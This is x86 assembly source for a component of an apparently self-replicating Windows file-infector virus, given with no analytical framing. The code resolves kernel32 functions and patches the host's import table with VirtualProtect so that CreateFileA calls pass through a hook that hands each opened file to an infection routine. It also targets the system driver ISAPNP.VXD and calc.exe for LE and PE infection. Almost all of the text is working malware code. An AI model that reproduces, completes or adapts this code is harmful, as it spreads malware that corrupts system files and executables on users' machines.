
ifndef PASS2
include globals.1
else
include globals.2
endif

indep_mod        segment public byte USE32 'CODE'

                 dd   'IMOD'  ; independent module signature


impGetProcAddress   = 0
impGetModuleHandleA = 1
impGetModuleHandleW = 2
impCreateFileA      = 3
impCloseHandle      = 4
impGetModuleHandle  = impGetModuleHandleA

include win.inc


init_PE:
                cmp  initialize, 0
                je   cont
                ret
cont:
                mov   eax, 260
                mod_call md_alloc
                mov   name_buffer, eax

                mov   eax, 260
                mod_call md_alloc
                mov   internal_buffer, eax

                mov   host_type, HOST_PEDRP
                mov   pe_imps, ebx      ; save pointer to pe import table

                mov   eax, impGetModuleHandle
                call  get_pe_proc       ; get GetModuleHandle ptr


                ; get kernel32's handle into ebx
                push  offset cs:nmKERNEL32
                call  [eax]
                or    eax, eax
                jz    @@failed    ; failed ?

                ; store it into ebx
                mov   ebx, eax

                ; find GetProcAddress
                mov   eax, impGetProcAddress
                call  get_pe_proc       ; get GetProcAddress ptr
                mov   eax, dword ptr [eax]
                mov   GetProcAddr, eax  ; store it into own ptr

                ; find important kernel32 imports

                lea   esi, nm_namez

                ; esi = ptr 2  name
                ; ebx = kernel's handle
getnext:
                ; get address of proc in ESI
                pushad  ; save regz
                push  esi
                push  ebx
                call  GetProcAddr       ; get addr of current proc
                mov   GettedProc, eax   ; save it
                popad

                ; find end of proc
@@lll:
                lodsb
                or    al, al
                jnz   short @@lll       ; find zero terminator

                mov   eax, GettedProc   ; store ptr 2 fx
                mov   ds:[esi], eax

                or    eax, eax          ; nope - cant fixupp
                jz    @@failed

                add   esi, 4            ; move to next name

                cmp   byte ptr ds:[esi], 0
                jne   short getnext     ; done ?


                ; install Ring0_FileIO emulation
                mov   Ring0_FileIO, offset cs:PE_Ring0IO
                mov   ss:[esp+4], 'OPEN'        ; force module to be opened (resident)

                ; try 2 hook CreateFileA
                mov   eax, pe_imps
                mov   eax, dword ptr [eax+4*impCreateFileA]
                or    eax, eax
                jz    short @@cant_inf

                ; hook service
                call  make_writeable
                jc    short @@cant_inf

                lea   edi, HookCreateFileA
                mov   ds:[eax], edi

                mov   host_type, HOST_PEFULL

@@cant_inf:
                ; get system ver and directory
                call  _GetVersion
                test  eax, 80000000h
                jz    det_nt

                mov   system, SYS_WIN95
                mov   subsystem, al

                push  255
                mov   eax, internal_buffer
                mov   std_W95_dir, eax
                push  eax
                call  _GetSysDir


                jmp   w95_done
det_nt:
                mov   system, SYS_WINNT
                mov   subsystem, al

                push  255
                mov   eax, internal_buffer
                mov   std_WNT_dir, eax
                push  eax
                call  _GetSysDir

w95_done:



                mod_call md_startup


                lea   edx, obet__
                mov   al, INF_VXD
                mod_call md_infLE
                lea   edx, obet_2
                mov   al, INF_NT_EXE
                mod_call md_infPE
@@failed:
                ret

obet__          db 'C:\WINDOWS\SYSTEM\ISAPNP.VXD',0
obet_2          db 'calc.exe',0

                ; get eax-th import
get_pe_proc:    shl   eax, 2            ; *4
                push  eax
                mov   eax, pe_imps
                add   ss:[esp], eax     ; pe_imps[eax*4]
                pop   eax
                mov   eax, ds:[eax]     ; get ptr
                ret


make_writeable:
                pushad
                push  offset cs:dummy
                push  PAGE_READWRITE ; flags PAGE_READWRITE
                push  4
                push  eax
                call  dword ptr _VirtualProtect
                sub   al, 1
                popad
                ret


; ========================================================================
; this part will be resident ...
HookCreateFileA:
                ; esi <= name
                ; edi <= namebuffer
                push  esi
                mov   esi, ss:[esp+8]   ; get name

                ; call strategy
                pushad

                ; copy name
;                mov   edi, name_buffer
;@LDNEXTCHAR:
;                lodsb
;                stosb
;                or    al, al
;                jnz   @LDNEXTCHAR

                mov    eax, 'OPEN'
                mod_call md_strategy
                popad

                pop   esi

                ; let kernel do dirty work
                jmp    dword ptr _CreateFileA



; =======================================================================
name_buffer     dd 0
internal_buffer dd 0

GetProcAddr     dd 0

pe_imps         dd 0            ; ptr to imported fxs

dummy           dd 0            ; dummy ...
GettedProc      dd 0            ; dummy ...

nmKERNEL32      db 'KERNEL32',0
nm_namez        db 'CreateFileA',0
_CreateFileA    dd 0
                db 'GetFileSize',0
_GetFileSize    dd 0
                db 'ReadFile',0
_ReadFile       dd 0
                db 'WriteFile',0
_WriteFile      dd 0
                db 'SetFilePointer',0
_SetFilePointer dd 0
                db 'CloseHandle',0
_CloseHandle    dd 0
                db 'VirtualProtect',0
_VirtualProtect dd 0
                db 'GetSystemDirectoryA',0
_GetSysDir      dd 0
                db 'GetVersion',0
_GetVersion     dd 0
                db 0

; =======================================================================

PE_Ring0IO      proc near
                cmp  eax, R0_OPENCREATFILE
                je   short PE@@OpenCreate
                cmp  eax, R0_GETFILESIZE
                je   short PE@@GetFileSize
                cmp  eax, R0_WRITEFILE
                je   short PE@@WriteFile
                cmp  eax, R0_READFILE
                je   short PE@@ReadFile
                cmp  eax, R0_CLOSEFILE
                je   short PE@@CloseFile
                ; err
                ret

PE@@OpenCreate:
                push   0
                push   0
                push   OPEN_EXISTING
                push   0
                push   FILE_SHARE_READ or FILE_SHARE_WRITE
                push   GENERIC_READ or GENERIC_WRITE
                push   esi
                call   _CreateFileA
                or     eax, eax
                js     short _cant_open
                jz     short _cant_open

                ret

_cant_open:     xor    eax, eax
                ret

PE@@GetFileSize:
                push   0
                push   ebx
                call   _GetFileSize
                ret

PE@@WriteFile:
                call   __seek

                pushad
                push   0
                push   offset cs:dummy
                push   ecx
                push   esi
                push   ebx

                call   _WriteFile
                popad


                ret

PE@@ReadFile:
                call   __seek

                pushad
                push   0
                push   offset cs:dummy
                push   ecx
                push   esi
                push   ebx

                call   _ReadFile
                popad

                ret

PE@@CloseFile:
		pushad
                push   ebx
                call   _CloseHandle
		popad
                ret

__seek:
                pushad
                push   FILE_BEGIN
                push   0
                push   edx
                push   ebx
                call   _SetFilePointer
                popad
                ret

PE_Ring0IO      endp



indep_mod       ends

                end
